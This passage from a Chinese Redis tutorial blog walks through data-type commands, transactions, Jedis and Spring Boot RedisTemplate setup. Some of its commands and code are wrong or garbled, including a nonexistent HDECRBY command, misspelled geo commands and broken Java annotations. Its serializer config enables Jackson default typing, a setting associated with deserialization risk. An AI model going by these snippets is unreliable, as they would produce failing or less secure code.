 <p><strong><span style="background-color:#ffd900">LINSERT</span> #将某个具体的value插入到列表中某个元素的前面或者后面!</strong><br> 127.0.0.1:6379&gt; Rpush mylist "hello"<br> 127.0.0.1:6379&gt; Rpush mylist "world"<br> 127.0.0.1:6379&gt;<strong> LINSERT mylist before "world" "other"</strong><br> 127.0.0.1:6379&gt; LRANGE mylist 0 -1</p> 
 <p>1)"hel1o"<br> 2) "other"</p> 
 <p>3)"wor1d"<br> 127.0.0.1:6379&gt;<strong>LINSERT mylist after world new</strong><br> 127.0.0.1:6379&gt; LRANGE mylist 0 -1</p> 
 <p>1) "he1lo"<br> 2) "other"</p> 
 <p>3) "world"</p> 
 <p>4) "new"</p> 
</blockquote> 
<h3><span style="color:#eaf4fc"><span style="background-color:#ed7976">应用场景</span></span></h3> 
<ul>
<li>
<strong><span style="background-color:#eaf4fc">1. 消息队列</span></strong><span style="background-color:#eaf4fc">  </span>     list类型的lpop和rpush（或者反过来，lpush和rpop）能实现队列的功能，不过我不推荐在实战中这么使用，因为现在已经有Kafka、NSQ、RabbitMQ等成熟的消息队列了，它们的功能已经很完善了。</li>
<li>
<span style="background-color:#eaf4fc"><strong>2. 排行榜 </strong> </span>  list类型的lrange命令可以分页查看队列中的数据。可将每隔一段时间计算一次的排行榜存储在list类型中，如京东每日的手机销量排行、学校每次月考学生的成绩排名、斗鱼年终盛典主播排名等，每计算一次，存储在list类型中，接口访问时，通过page和size分页获取打擂金曲。<strong>只有定时计算的排行榜才适合使用list类型存储</strong>，与定时计算的排行榜相对应的是实时计算的排行榜，list类型不能支持实时计算的排行榜</li>
<li>
<strong><span style="background-color:#eaf4fc">3. 最新列表 </span></strong>   list类型的lpush命令和lrange命令能实现最新列表的功能，每次通过lpush命令往列表里插入新的元素，然后通过lrange命令读取最新的元素列表，如朋友圈的点赞列表、评论列表。<strong>只有不需要分页（比如每次都只取列表的前5个元素）或者更新频率低（比如每天凌晨更新一次）的列表才适合用list类型实现</strong>。对于需要分页并且会频繁更新的列表，需用使用有序集合sorted set类型实现。另外，需要<strong>通过时间范围查找的最新列表，list类型也实现不了</strong>，也需要通过有序集合sorted set类型实现，如以成交时间范围作为条件来查询的订单列表。</li>
</ul> 
<p>对于排行榜和最新列表两种应用场景，list类型能做到的sorted set类型都能做到，list类型做不到的sorted set类型也能做到，那为什么还要使用list类型去实现排行榜或最新列表呢，直接用sorted set类型不是更好吗？<strong>原因是sorted set类型占用的内存容量是list类型的数倍之多</strong></p> 
<h1 id="Set(%E9%9B%86%E5%90%88)"><span style="background-color:#ffd900">Set(集合)</span></h1> 
<p>set 类似于 Java 中的 <code>HashSet</code> 。Redis 中的 set 类型是一种无序集合，集合中的元素<strong>没有先后顺序。当你需要存储一个列表数据，又不希望出现重复数据时，</strong>set 是一个很好的选择，并且 set 提供了判断某个成员是否在一个 set 集合内的重要接口，这个也是 list 所不能提供的。<strong>可以基于 set 轻易实现交集、并集、差集的操作</strong>。比如：你可以将一个用户所有的关注人存在一个集合中，将其所有粉丝存在一个集合。Redis 可以非常方便的实现如共同关注、共同粉丝、共同喜好等功能。这个过程也就是求交集的过程。</p> 
<blockquote> 
 <p><strong><span style="background-color:#ffd900">sadd</span></strong></p> 
 <p>127.0.0.1:6379&gt; sadd mySet value1 value2<strong> # 添加元素进去</strong><br> (integer) 2<br> 127.0.0.1:6379&gt; sadd mySet value1  # 不允许有重复元素<br> (integer) 0</p> 
 <p><strong><span style="background-color:#ffd900">smembers</span></strong><br> 127.0.0.1:6379&gt; smembers mySet <strong># 查看 set 中所有的元素</strong><br> 1) "value1"<br> 2) "value2"</p> 
 <p><strong><span style="background-color:#ffd900">scard</span></strong><br> 127.0.0.1:6379&gt; scard mySet <strong># 查看 set 的长度</strong><br> (integer) 2</p> 
 <p><strong><span style="background-color:#ffd900">sismember</span></strong><br> 127.0.0.1:6379&gt; sismember mySet value1 <strong># 检查某个元素是否存在set 中，只能接收单个元素</strong></p> 
 <p><strong><span style="background-color:#ffd900">srem </span></strong></p> 
 <p>127.0.0.1:6379&gt;srem myset value1 <strong>#移除set集合中的指定元素</strong></p> 
 <p><span style="background-color:#ffd900">SRANDMEMBER</span><br> 127.0.0.1:6379&gt;SRANDMEMBER myset  #<strong>随机抽选出一个元素</strong></p> 
 <p>127.0.0.1:6379&gt;SRANDMEMBER myset 2  #随机抽选出指定个数的元素</p> 
 <p><strong><span style="background-color:#ffd900">spop</span></strong></p> 
 <p>127.0.0.1:6379&gt;spop myset  <strong> #随机删除一些set集合中的元素!</strong></p> 
 <p><strong><span style="background-color:#ffd900">smove</span></strong><br> 127.0.0.1:6379&gt; smove myset myset2 "asdf"  <strong># 将一个指定的值，移动到另外一个set集合!</strong></p> 
 <p><strong><span style="background-color:#ffd900">SDIFF 差集 SINTER 交集 SUNION 并集</span></strong><br> 127.0.0.1:6379&gt; sinterstore mySet3 mySet mySet2 # 获取 mySet 和 mySet2 的交集并存放在 mySet3 中</p> 
 <p>127.0.0.1:6379&gt;SDIFF key1 key2  #差集   不同的<br> 127.0.0.1:6379&gt; SINTER key1 key2   #交集   共有的<br> 127.0.0.1:6379&gt;SUNION key1 key2  #并集</p> 
</blockquote> 
<h3><span style="color:#eaf4fc"><strong><span style="background-color:#ed7976">应用场景</span></strong></span></h3> 
<ul>
<li>
<strong><span style="background-color:#eaf4fc">1. 标签 </span></strong>  比如我们博客网站常常使用到的兴趣标签，把一个个有着相同爱好，关注类似内容的用户利用一个标签把他们进行归并。</li>
<li>
<strong><span style="background-color:#eaf4fc">2、关注好友//粉丝/感兴趣的人集合</span></strong> 共同好友功能，共同喜好，或者可以引申到二度好友之类的扩展应用。</li>
<li>
<strong><span style="background-color:#eaf4fc">3、统计网站的独立IP   </span></strong>利用set集合当中元素不唯一性，可以快速实时统计访问网站的独立IP。</li>
<li> <p><strong><span style="background-color:#eaf4fc">4、 随机展示</span></strong>   通常，app首页的展示区域有限，但是又不能总是展示固定的内容，一种做法是先确定一批需要展示的内容，再从中随机获取。</p> </li>
<li> <p><strong><span style="background-color:#eaf4fc">5、黑名单/白名单</span></strong>   经常有业务出于安全性方面的考虑，需要设置用户黑名单、ip黑名单、设备黑名单等，set类型适合存储这些黑名单数据，sismember命令可用于判断用户、ip、设备是否处于黑名单之中。</p> </li>
</ul> 
<h1 id="Hash%EF%BC%88%E5%93%88%E5%B8%8C%EF%BC%89"><span style="background-color:#ffd900">Hash（哈希）</span></h1> 
<p>hash 类似于 JDK1.8 前的 HashMap，内部实现也差不多(数组 + 链表)。不过，Redis 的 hash 做了更多优化。另外，hash 是一个 string 类型的 field 和 value 的映射表，<strong>特别适合用于存储对象</strong>，后续操作的时候，你可以直接仅仅修改这个对象中的某个字段的值。 比如我们可以 hash 数据结构来存储用户信息，商品信息等等。</p> 
<blockquote> 
 <p><strong><span style="background-color:#ffd900">hset、hget</span></strong></p> 
 <p>127.0.0.1:6379&gt; hset myhash field1 hello <strong># set 一个具体的key-value</strong></p> 
 <p>127.0.0.1:6379&gt; hget myhash field1  <strong># 获取存储在哈希表中指定字段的值。</strong></p> 
 <p><strong><span style="background-color:#ffd900">hmset、 hmget</span></strong></p> 
 <p>127.0.0.1:6379&gt; hmset myhash field1 hello field2 world <strong># set多个 key-vlaue</strong><br> 127.0.0.1:6379&gt; hmget myhash field1 field2  <strong>#获取多个字段值</strong></p> 
 <p>1) "hello"<br> 2)"world"</p> 
 <p><strong><span style="background-color:#ffd900">hgetall</span></strong><br> 127.0.0.1:6379&gt; hgetall myhash <strong># 获取在哈希表中指定 key 的所有字段和值</strong></p> 
 <p>1)"field1"</p> 
 <p>2) "hello"<br> 3)"field2"</p> 
 <p>4)"world"</p> 
 <p><strong><span style="background-color:#ffd900">hdel</span></strong></p> 
 <p>127.0.0.1:6379&gt; hdel myhash field1 <strong>#删除hash指定key字段!对应的value值也就消失了!</strong></p> 
 <p><strong><span style="background-color:#ffd900">hlen</span></strong><br> 127.0.0.1:6379&gt; hlen myhash <strong>#获取hash表的字段数量!</strong></p> 
 <p><strong><span style="background-color:#ffd900">hexists</span></strong></p> 
 <p>127.0.0.1:6379&gt; hexists myhash field1 <strong># 查看 hash中指定的字段是否存在。</strong></p> 
 <p><strong><span style="background-color:#ffd900">hkeys、 hvals </span></strong></p> 
 <p>127.0.0.1:6379&gt; hkeys myhash <strong># 获取 key 列表</strong></p> 
 <p>127.0.0.1:6379&gt; hvals myhash <strong># 获取 value 列表</strong></p> 
 <p><strong><span style="background-color:#ffd900">HINCRBY、HDECRBY、hsetnx</span></strong><br> 127.0.0.1:6379&gt; HINCRBY myhash field3 1  <strong>#指定增量</strong><br> 127.0.0.1:6379&gt; HDECRBY myhash field3 4<br> 127.0.0.1:6379&gt; hsetnx myhash field4 hello  <strong> #如果不存在则可以设置</strong><br> 127.0.0.1:6379&gt; hsetnx myhash field4 world  <strong>#如果存在则不能设置</strong></p> 
 <p><strong><span style="background-color:#ffd900">对象</span></strong></p> 
 <p><strong>127.0.0.1:6379&gt; hset userInfoKey name "guide" description "dev" age "24"</strong></p> 
 <p><strong>hash变更的数据user name age,尤其是是用户信息之类的，经常变动的信息! hash更适合于对象的存储，String更加适合字符串存储!</strong></p> 
</blockquote> 
<h3><span style="color:#eaf4fc"><span style="background-color:#ed7976">应用场景</span></span></h3> 
<p>hash类型是一个string类型的field和value的映射表</p> 
<ul>
<li>
<strong><span style="background-color:#eaf4fc">1. 购物车</span></strong>　以用户id为key，商品id为field，商品数量为value，恰好构成了购物车的3个要素</li>
<li>
<strong><span style="background-color:#eaf4fc">2. 存储对象</span></strong>    hash类型的(key, field, value)的结构与对象的(对象id, 属性, 值)的结构相似，也可以用来存储对象。</li>
</ul> 
<p><span style="color:#be191c"><strong>一般对象用string + json存储，对象中某些频繁变化的属性抽出来用hash存储</strong></span></p> 
<h1 id="Sorted%20set%EF%BC%88Zset%E6%9C%89%E5%BA%8F%E9%9B%86%E5%90%88%EF%BC%89"><span style="background-color:#ffd900">Sorted set（Zset有序集合）</span></h1> 
<p>和 set 相比，sorted set 增加了一个权重参数 score，使得集合中的元素能够按 score 进行有序排列，还可以通过 score 的范围来获取元素的列表。有点像是 Java 中 HashMap 和 TreeSet 的结合体。<strong>set k1 v1 -----  zset k1 score1 v1</strong></p> 
<blockquote> 
 <p><strong><span style="background-color:#ffd900">zadd</span></strong></p> 
 <p>127.0.0.1:6379&gt; zadd myZset 3.0 value1 <strong># 添加元素到 sorted set 中 3.0 为权重</strong></p> 
 <p>127.0.0.1:6379&gt; zadd myZset 2.0 value2 1.0 value3 <strong># 一次添加多个元素</strong></p> 
 <p><strong><span style="background-color:#ffd900">zrange</span></strong></p> 
 <p>127.0.0.1:6379&gt; zrange  myZset 0 -1<strong> # 顺序输出某个范围区间的元素，0 -1 表示输出所有元素</strong></p> 
 <p><strong><span style="background-color:#ffd900">zrevrange  </span></strong></p> 
 <p>127.0.0.1:6379&gt; zrevrange  myZset 0 -1<strong> # 逆序输出某个范围区间的元素，0 为 start  1 为 stop</strong></p> 
 <p><strong><span style="background-color:#ffd900">zcard</span></strong></p> 
 <p>127.0.0.1:6379&gt; zcard myZset <strong># 查看 sorted set 中的元素数量</strong></p> 
 <p><strong><span style="background-color:#ffd900">zscore</span> </strong></p> 
 <p>127.0.0.1:6379&gt; zscore myZset value1<strong> # 查看某个 value 的权重</strong></p> 
 <p><strong><span style="background-color:#ffd900">ZRANGEBYSCORE</span></strong></p> 
 <p>127.0.0.1:6379&gt;<strong>ZRANGEBYSCORE salary -inf +inf # 显示全部的用户从小到大!</strong><br> 127.0.0.1:6379&gt;ZRANGEBYSCORE salary -inf +inf <strong>withscores</strong> <strong># 显示全部的用户并且附带成绩</strong><br> 127.0.0.1:6379&gt;ZRANGEBYSCORE salary <strong>-inf 2500</strong> <strong>withscores</strong> <strong># 显示工资小于2500员工的升序排序!</strong></p> 
 <p><strong><span style="background-color:#ffd900">zrem</span></strong><br> 127.0.0.1:6379&gt;zrem salary xiaohong <strong> #移除有序集合中的指定元素</strong></p> 
 <p><strong><span style="background-color:#ffd900">zcount</span></strong></p> 
 <p>127.0.0.1:6379&gt; zcount myset 1 3 <strong># 获取指定区间的成员数量!</strong></p> 
</blockquote> 
<h3><span style="color:#eaf4fc"><span style="background-color:#ed7976">应用场景</span></span></h3> 
<ul>
<li> 1、根据时间排序的新闻列表等，</li>
<li>2、 阅读排行榜</li>
</ul> 
<h1 id="geospatial%EF%BC%88%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%EF%BC%89"><span style="background-color:#a2e043">geospatial（地理位置）</span></h1> 
<p>朋友的定位，附近的人，打车距离计算？Redis的Geo在Redis3.2版本就推出了!这个功能可以推算地理位置的信息，两地之间的距离，方圆几里的人!</p> 
<ul>
<li><strong>有效的经度从-180度到180度。</strong></li>
<li><strong>有效的纬度从-85.05112878度到85.05112878度。</strong></li>
</ul> 
<p>当坐标位置超出上述指定范围时，该命令将会返回一个错误。</p> 
<blockquote> 
 <p><strong><span style="background-color:#ffd900">getadd   </span>添加地理位置</strong><br><strong>#规则:两级无法直接添加，我们一般会下载城市数据，直接通过java程序一次性导入</strong></p> 
 <p><strong>#参数key值<span style="background-color:#ffd900">（经度、纬度、名称)</span></strong></p> 
 <p>127.0.0.1:6379&gt; geoadd china:city 116.40 39.90 beijing<br> 127.0.0.1:6379&gt; geoadd china:city 121.47 31.23 shanghai<br> 127.0.0.1:6379&gt; geoadd china:city 106.50 29.53 chongqing 114.05 22.52 shenzhen<br> 127.0.0.1:6379&gt; geoadd china:city 120.16 30.24 hangzhou 108.96 34.26 xian<br><strong><span style="background-color:#ffd900">getpos</span></strong></p> 
 <p>127.0.0.1:6379&gt;GEOPos china:city beijing <strong># 获取指定的城市的经度和纬度!</strong></p> 
 <p>1)1) "116.39999896287918091"<br> 2) "39.90000009167092543"<br><strong><span style="background-color:#ffd900">getdist </span></strong><span style="background-color:#e7fafa">指定单位的参数 unit 必须是以下单位的其中一个：</span></p> 
 <ul>
<li>
<strong><span style="background-color:#e7fafa">m</span></strong><span style="background-color:#e7fafa"> 表示单位为米。</span>
</li>
<li>
<strong><span style="background-color:#e7fafa">km</span></strong><span style="background-color:#e7fafa"> 表示单位为千米。</span>
</li>
<li>
<strong><span style="background-color:#e7fafa">mi</span></strong><span style="background-color:#e7fafa"> 表示单位为英里。</span>
</li>
<li>
<strong><span style="background-color:#e7fafa">ft</span></strong><span style="background-color:#e7fafa"> 表示单位为英尺。</span>
</li>
</ul> 
 <p><span style="background-color:#e7fafa">没有显式地指定单位参数， 那么 </span><code><span style="background-color:#e7fafa">GEODIST</span></code><span style="background-color:#e7fafa"> 默认使用米作为单位。</span></p> 
 <p>127.0.0.1:6379&gt;GEODIST china: city beijing shanghai  <strong>#返回两个给定位置之间的直线距离</strong></p> 
 <p>"1067378.7564"<br> 127.0.0.1:6379&gt; GEODIST china: city beijing shanghai <strong>km</strong></p> 
 <p>"1067.3788"<br><strong><span style="background-color:#ffd900">georadius</span>以给定的经纬度为中心， 找出某一半径内的元素【<span style="color:#1c7331">以自己为中心找附近的人</span>】</strong></p> 
 <p>127.0.0.1:6379&gt;GEORADIUS china:city <span style="color:#1c7331"><strong>110 30</strong></span> 1000 km<strong> # 以110，30这个经纬度为中心，寻找方圆1000km内的城市</strong><br> 127.0.0.1:6379&gt; GEORADIus china:city 110 30 500 km <strong>withdist #在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。</strong></p> 
 <p>127.0.0.1:6379&gt; GEORADIus china:city 110 30 500 km <strong>WITHCOORD #将位置元素的经度和维度也一并返回。</strong></p> 
 <p>127.0.0.1:6379&gt; GEORADIus china:city 110 30 500 km <strong>withdist WITHCOORD count 1 #指定返回结果数量</strong></p> 
 <p></p> 
 <ul>
<li>
<code>ASC</code>: 根据中心的位置， 按照从近到远的方式返回位置元素。</li>
<li>
<code>DESC</code>: 根据中心的位置， 按照从远到近的方式返回位置元素。</li>
</ul> 
 <p><strong><span style="background-color:#ffd900">GEORADIUSBYMEMBER</span>找出位于指定范围内的元素，中心点是由给定的位置元素决定</strong></p> 
 <p><strong>【<span style="color:#1c7331">导航定位</span>】</strong></p> 
 <p>127.0.0.1:6379&gt; GEORADIUSBYMEMBER china:city <span style="color:#1c7331"><strong>beijing</strong></span> 1000 km</p> 
 <p>1)"beijing"<br> 2) "xian"<br> 127.0.0.1:6379&gt; GEORADIUSBYMEMBER china:city <span style="color:#1c7331"><strong>shanghai</strong></span> 400 km</p> 
 <p>1) "hangzhou"<br> 2) "shanghai"<br><strong><span style="background-color:#ffd900">geohash</span>返回一个或多个位置元素的Geohash表示</strong></p> 
 <p><strong># 将二维的经纬度转换为一维的字符串(11位)，如果两个字符串越接近，那么则距离越近!</strong><br> 127.0.0.1:6379&gt; geohash china:city beijing chongqi</p> 
 <p>1) "wx4fbxxfkeo"<br> 2) "wm5xzrybtyo"<br><span style="color:#be191c"><strong>GEO底层的实现原理其实就是Zset !我们可以使用Zset命令来操作geo !</strong></span><br> 127.0.0.1:6379&gt;<span style="color:#be191c"><strong>ZRANGE</strong></span> china:city 0 -1  <span style="color:#be191c"><strong> #查看地图中全部的元素</strong></span><br> 127.0.0.1:6379&gt; <span style="color:#be191c"><strong>zrem</strong></span> china:city beijing    <span style="color:#be191c"><strong>#移除指定元素</strong></span></p> 
</blockquote> 
<h1 id="Hyperloglog"><span style="background-color:#a2e043">Hyperloglog</span></h1> 
<p><span style="color:#ff9900"><strong>基数（不重复的元素）统计的算法</strong></span>，占用内存固定，2^64不同的元素只需要12KB的内存。<strong>比如网页的UV (一个人访问一个网站多次，但是还是算作一个人! )</strong>传统的方式，set保存用户的id，然后就可以统计set 中的元素数量作为标准判断!这个方式如果保存大量的用户id，就会比较麻烦!我们的目的是为了计数，而不是保存用户id ;hyperloglog 会有0.81%错误率!统计UV任务，可以忽略不计的!</p> 
<blockquote> 
 <p><strong><span style="background-color:#ffd900">PFadd  PFCOUNT PFMERGE</span></strong></p> 
 <p>127.0.0.1:6379&gt; <strong>PFadd </strong>mykey a b c d e f g h i j   <strong># 创建第一组元素 mykey</strong><br> 127.0.0.1:6379&gt;<strong>PFCOUNT</strong> mykey     <strong> # 统计 mykey元素的基数数量</strong></p> 
 <p>(integer) 10<br> 127.0.0.1:6379&gt; PFadd mykey2 i j z x c v b n m <strong>#创建第二组元素</strong> <br> 127.0.0.1:6379&gt; PFCOUNT mykey2</p> 
 <p>(integer) 9<br> 127.0.0.1:6379&gt;<strong> PFMERGE</strong> mykey3 mykey mykey2 <strong>#合并两组 mykey mykey2 =&gt; mykey3并集</strong><br> 127.0.0.1:6379&gt; PFCOUNT mykey3   <strong> #看并集的数量!</strong></p> 
 <p>(integer) 15</p> 
</blockquote> 
<p>如果允许容错，那么一定可以使用Hyperloglog ! 如果不允许容错，就使用set或者自己的数据类型即可!</p> 
<h1 id="Bitmaps"><span style="background-color:#a2e043">Bitmaps</span></h1> 
<p>位存储，0 1 0 1 0 1......统计用户信息，活跃，不活跃!登录、未登录!打卡，365打卡! Bitmaps位图，数据结构!都是操作二进制位来进行记录，就只有0和1两个状态!</p> 
<p><img alt="" height="62" src="https://images2.imgbox.com/97/0d/P5vf2AzM_o.png" width="149"></p> 
<p><strong>使用bitmap来记录周一到周日的打卡!</strong></p> 
<p><strong>周一∶1周二:0周三:0 周四:1 周五∶1 周六:0 周日:0 </strong></p> 
<blockquote> 
 <p><strong><span style="background-color:#ffd900">setbit</span></strong></p> 
 <p>127.0.0.1:6379&gt;setbit sign 0 1</p> 
 <p>127.0.0.1:6379&gt;setbit sign 1 0<br> 127.0.0.1:6379&gt;setbit sign 2 0<br> 127.0.0.1:6379&gt;setbit sign 3 1<br> 127.0.0.1:6379&gt;setbit sign 4 1<br> 127.0.0.1:6379&gt;setbit sign 5 0<br> 127.0.0.1:6379&gt;setbit sign 6 0</p> 
 <p><strong>查看某一天是否打卡</strong></p> 
 <p><strong><span style="background-color:#ffd900">getbit</span></strong></p> 
 <p>127.0.0.1:6379&gt;getbit sign 6 </p> 
 <p><strong>统计操作，统计打卡的天数</strong></p> 
 <p><strong><span style="background-color:#ffd900">bitcount</span></strong></p> 
 <p>127.0.0.1:6379&gt;bitcount sign </p> 
</blockquote> 
<h1 id="%E5%9B%9B%E3%80%81%E4%BA%8B%E5%8A%A1">四、事务</h1> 
<p><strong><span style="color:#ff9900">Redis 中的事务是一组命令的集合</span></strong>，是 Redis 的最小执行单位。它可以保证<span style="color:#ff9900"><strong>一次执行多个命令</strong></span>，事务中的所有命令都会<span style="color:#ff9900"><strong>序列化、按顺序地执行</strong></span>。服务端在<span style="color:#ff9900"><strong>执行事务的过程中，不会被</strong></span>其他客户端发送来的命令请求<span style="color:#ff9900"><strong>打断</strong></span>。redis事务没有隔离级别的概念，不会出现脏读幻读之类的，所有的命令在事务中，并没有直接被执行!只有发起执行命令exec的时候才会执行，<span style="color:#ff9900"><strong>Redis单条命令式保存原子性的，但是事务不保证原子性!</strong></span><br> redis的事务∶</p> 
<ul>
<li><span style="background-color:#d7d8d9">开启事务（multi)</span></li>
<li><span style="background-color:#d7d8d9">命令入队(.....)</span></li>
<li><span style="background-color:#d7d8d9">执行事务（exec)</span></li>
</ul> 
<blockquote> 
 <p>127.0.0.1:6379&gt; <strong>multi   #开启事务</strong><br> 127.0.0.1:6379&gt; set k1 v1<br> 127.0.0.1:6379&gt; set k2 v2<br> 127.0.0.1:6379&gt;get k2<br> 127.0.0.1:6379&gt;set k3 v3<br> 127.0.0.1:6379&gt;<strong>exec   #执行 </strong></p> 
</blockquote> 
<blockquote> 
 <p><span style="color:#ff9900"><strong>放弃事务</strong></span></p> 
 <p>127.0.0.1:6379&gt; <strong>multi  </strong><br> 127.0.0.1:6379&gt; set k1 v1<br> 127.0.0.1:6379&gt; set k2 v2<br> 127.0.0.1:6379&gt;<strong>discard  #取消事务，事务队列中的命令都不会执行</strong></p> 
</blockquote> 
<blockquote> 
 <p><span style="color:#ff9900"><strong>编译型异常（代码有问题!命令有错!)），事务中所有的命令都不会被执行!</strong></span><br> 127.0.0.1:6379&gt; multi<br> 127.0.0.1:6379&gt;set k1 v1<br> 127.0.0.1:6379&gt; set k2 v2<br> 127.0.0.1:6379&gt; <strong>getset k3 #没有这个命令，命令错误</strong><br> (error) ERR wrong number of arguments for 'getset' command</p> 
 <p>127.0.0.1:6379&gt; set k4 v4<br> QUEUED<br> 127.0.0.1:6379&gt;set k5 v5</p> 
 <p>QUEUED<br> 127.0.0.1:6379&gt;exec <strong> #运行报错</strong><br> (error)EXECABORT Transaction discarded because of previous errors.</p> 
 <p>127.0.0.1:6379&gt; get k5 <strong> #查看，队列中命令果然都没有执行</strong><br> (nil)</p> 
</blockquote> 
<blockquote> 
 <p><span style="color:#ff9900"><strong>运行时异常(1/0），如果事务队列中存在语法性，那么执行命令的时候，其他命令是可以正常执行的，错误命令抛出异常</strong></span></p> 
 <p>127.0.0.1:6379&gt;set k1 "v1"<br> 127.0.0.1: 6379&gt; multi<br> 127.0.0.1:6379&gt;incr k1 <strong>#字符串类型自增报错</strong><br> 127.0.0.1:6379&gt;set k2 v2<br> 127.0.0.1:6379&gt; set k3 v3<br> 127.0.0.1:6379&gt;get k3<br> 127.0.0.1:6379&gt;exec   <strong>#运行第一条命令抛出，会执行其他命令</strong><br> 1) (error)ERR value is not an integer or out of range</p> 
 <p>2)OK<br> 3) OK</p> 
 <p>4) "v3"</p> 
</blockquote> 
<h2 id="%E4%B9%90%E8%A7%82%E9%94%81%E5%92%8C%E6%82%B2%E8%A7%82%E9%94%81">乐观锁和悲观锁</h2> 
<p>悲观锁总是假设最坏的情况，认为共享资源每次被访问的时候就会出现问题(比如共享数据被修改)，所以每次在获取资源操作的时候都会上锁，这样其他线程想拿到这个资源就会阻塞直到锁被上一个持有者释放。也就是说，<strong>共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程</strong>。</p> 
<p>乐观锁总是假设最好的情况，认为共享资源每次被访问的时候不会出现问题，线程可以不停地执行，<strong>无需加锁也无需等待</strong>，<strong>只是在提交修改的时候去验证对应的资源</strong>（也就是数据）<strong>是否被其它线程修改了（具体方法可以使用版本号机制或 CAS 算法）。</strong></p> 
<h2 id="redis%E7%9B%91%E8%A7%86%E6%B5%8B%E8%AF%95%C2%A0%20watch%20unwatch%20-----redis%E5%AE%9E%E7%8E%B0%E4%B9%90%E8%A7%82%E9%94%81"><strong>redis监视测试  watch unwatch -----redis实现乐观锁</strong></h2> 
<p><img alt="" height="319" src="https://images2.imgbox.com/b8/91/SXWwEaxG_o.png" width="502"></p> 
<p><img alt="" height="330" src="https://images2.imgbox.com/4b/17/Wz4pJfrB_o.png" width="922"></p> 
<p><img alt="" height="304" src="https://images2.imgbox.com/9e/a5/KBgyevC1_o.png" width="882"></p> 
<h1 id="%E4%BA%94%E3%80%81Jedis%EF%BC%88%E4%BD%BF%E7%94%A8Java%E6%9D%A5%E6%93%8D%E4%BD%9C%20Redis%EF%BC%89">五、Jedis（<strong>使用Java来操作 Redis</strong>）</h1> 
<p><strong>使用Java来操作 Redis，</strong>什么是Jedis？是Redis官方推荐的java连接开发工具!使用Java操作Redis 中间件!如果你要使用java操作redis，那么一定要对Jedis十分的熟悉!</p> 
<p><strong>1、导入对应的依赖</strong></p> 
<p><img alt="" height="259" src="https://images2.imgbox.com/65/ea/iq1L9Nch_o.png" width="461"></p> 
<p><strong>2、编码测试∶</strong></p> 
<ul>
<li>连接数据库</li>
<li>操作命令</li>
<li>断开连接</li>
</ul> 
<p><strong>连接redis，输出pong代表连接成功</strong></p> 
<p><img alt="" height="183" src="https://images2.imgbox.com/b7/ed/Sk5Nku0j_o.png" width="456"><img alt="" height="97" src="https://images2.imgbox.com/19/34/u4FOc7Es_o.png" width="332"></p> 
<p>再次理解事务</p> 
<p><img alt="" height="286" src="https://images2.imgbox.com/9c/c2/kdW4M1Li_o.png" width="352"></p> 
<h1 id="%E5%85%AD%E3%80%81SpringBoot%E9%9B%86%E6%88%90Redis">六、SpringBoot集成Redis</h1> 
<p>SpringBoot操作数据:spring-data jpa jdbc mongodb redis !SpringData也是和SpringBoot齐名的项目!说明︰<strong>在SpringBoot2.x之后，原来使用的jedis被替换为了lettuce?</strong><br> jedis :采用的直连，多个线程操作的话，是不安全的，如果想要避免不安全的，使用jedis pool连接池!更像BIO模式</p> 
<p>lettuce : 采用netty，实例可以再多个线程中进行共享，不存在线程不安全的情况!可以减少线程数据了，更像NIO模式<br><img alt="" height="294" src="https://images2.imgbox.com/a7/44/o63aFv8N_o.png" width="591"></p> 
<h2 id="%E6%95%B4%E5%90%88%E6%B5%8B%E8%AF%95">整合测试</h2> 
<p><strong>1、导入依赖</strong></p> 
<pre><code class="language-java">&lt;!--操作redis --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre> 
<p><strong>2、配置连接</strong></p> 
<pre><code class="language-java">#配置redis
spring.redis.host=127.0.0.1
spring.redis.port=6379
</code></pre> 
<p><strong>3、测试</strong></p> 
<pre><code class="language-java">@SpringBootTest
class Redis02SpringbootApplicationTests {
    @Autowired
    private RedisTemplate redisTemplate;
    @Test
    void contextLoads() {
        // redisTemplate操作不同的数据类型，api和我们的指令是一样的
        // opsForvalue 操作字符串 类似string
        // opsForList 操作List 类似List
        // opsForset
        // opsForHash 
        // opsForzsetl 
        // opsForGeo
        // opsForHyperLogLog
//除了进本的操作，我们常用的方法都可以直接通过redisTemplate操作，比如事务，和基本的CRUD
//获取redis的连接对象

//Redisconnection connection = redisTemplate.getconnectionFactory().getconnection ();
//connection.flushDb();
//connection.flushAll();
    redisTemplate.opsForvalue().set("mykey", "asdf");
    system.out.println(redisTemplate.opsForvalue().get("mykey"));
    }
}</code></pre> 
<h1 id="%E4%B8%83%E3%80%81%E8%87%AA%E5%AE%9A%E4%B9%89RedisTemplate">七、自定义RedisTemplate</h1> 
<p>真实的开发一般使用json来传递对象，直接传递对象会报错，所有的对象需要序列化</p> 
<pre><code class="language-java">@Component
@AllArgsConstructor
@NoArgsConstructorData
//在企业中，我们的所有pojo都会序列化
SpringBootpublic class User implements Serializable {
    private String name;
    private int age;
}
</code></pre> 
<h2 id="%C2%A0%E8%87%AA%E5%AE%9A%E4%B9%89redisTemplate"> 自定义redisTemplate</h2> 
<pre><code class="language-java">@Configuration
public class RedisConfig{
//自己定义一个RedisTemplate
@Bean
@SuppressWarnings("all")
public RedisTemplate&lt;String, Object&gt; redisTemplate (RedisconnectionFactory factory){
    //我们为了自己开发方便，一般直接使用&lt;String, object&gt;
    RedisTemplate&lt;String, Object&gt; template = new RedisTemplate&lt;String, Object&gt;();
        template.setConnectionFactory(factory);
        // Json序列化配置
  Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new 
                                 Jackson2JsonRedisSerializer(Object.class);
        ObjectMapper om = new ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);
        //String 的序列化
        StringRedisSerializer stringRedisSerializer = new StringRedisSerializer();
        // key采用String的序列化方式
        template.setKeySerializer(stringRedisSerializer);
        // hash的key采用String的序列化方式
        template.setHashKeySerializer(stringRedisSerializer);
        // Value序列化方式采用jackson
        template.setValueSerializer(jackson2JsonRedisSerializer);
        // hash的Value序列化方式采用jackson
        template.setHashValueSerializer(jackson2JsonRedisSerializer);
        template.afterPropertiesSet();
        return template;
    }
}</code></pre> 
